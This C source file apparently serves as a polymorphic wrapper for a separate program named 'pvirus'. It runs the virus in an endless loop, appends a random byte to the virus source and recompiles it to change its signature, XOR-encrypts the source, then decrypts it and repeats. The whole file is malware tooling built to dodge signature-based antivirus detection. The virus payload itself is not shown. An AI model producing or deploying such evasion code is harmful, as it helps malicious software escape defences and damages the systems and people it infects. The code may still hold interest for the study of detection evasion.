#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <time.h>

/*Author: Parker Arnold*/

int morphEncrypt();
void decrypt(int key); 

int main() {
	/*Runs infintely running the virus, encoding, waiting 3 seconds, then decoding and
	starting again*/
	while (1) {
		system("./pvirus");
		int key = morphEncrypt();
		sleep(3);
		decrypt(key);
	}
	
}

/*This method was created with the help of previously made code. XOR Encryption was derived.*/
int morphEncrypt() {
	int key;
    char chr;
    char morph[50];
	FILE *encrypt;
	
	srand(time(0));
	key = (rand() % 255) + 1;
	
	/*morphs the virus by deleting the old and creating a new with a different
	signature(ORIGINAL CODE)*/
	snprintf(morph, 50, "echo //%c >> pvirus.c", key);
	system(morph);
	system("rm pvirus");
	system("gcc -g -Wall -o pvirus pvirus.c");
	
	encrypt = fopen("pvirus.c", "r+");
	if (encrypt == NULL) {
		exit(0);
	}
	/*Encrypts file character by character*/
	fseek(encrypt, 0, SEEK_SET);
	while ( (chr = fgetc(encrypt)) != EOF) {
		fseek(encrypt, ftell(encrypt)-1, SEEK_SET);
		fprintf(encrypt, "%c", chr ^ key);
	}
	fclose(encrypt);
	
	return key;
}

//This method was created with the help of previously made code. XOR Decryption was derived.
void decrypt(int key) {
	 char chr;
	 FILE *decrypt;
	 
	 decrypt = fopen("pvirus.c", "r+");
	if (decrypt == NULL) {
		exit(0);
	}
	/*Decrypts file character by character*/
	fseek(decrypt, 0, SEEK_SET);
	while ( (chr = fgetc(decrypt)) != EOF) {
		fseek(decrypt, ftell(decrypt)-1, SEEK_SET);
		fprintf(decrypt, "%c", chr ^ key);
	}
	fclose(decrypt);
}
